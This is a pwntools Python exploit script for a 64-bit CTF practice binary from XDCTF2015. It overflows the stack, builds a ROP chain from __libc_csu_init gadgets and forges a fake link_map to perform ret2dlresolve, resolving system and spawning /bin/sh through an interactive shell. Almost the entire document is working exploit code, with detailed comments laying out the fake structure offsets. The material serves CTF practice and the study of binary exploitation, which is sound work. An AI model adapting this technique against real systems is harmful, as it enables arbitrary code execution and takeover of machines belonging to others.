from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637


def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'           # cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

fake_linkmap_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
libc = ELF('libc.so.6')
link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got['read'],libc.sym['system']- libc.sym['read'])
rop.raw(csu(0, 1, elf.got['read'], 0, fake_linkmap_addr, len(link_map)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain()) <= 256)
io.send(rop.chain())
# send linkmap
io.send(link_map)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
#0x00000000004007a1: pop rsi; pop r15; ret; 
rop.raw(0x00000000004007a1)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004007a3)  # 0x00000000004007a3: pop rdi; ret;
rop.raw(fake_linkmap_addr + 0x48)
rop.raw(resolve_call)
io.send(rop.chain())
io.interactive()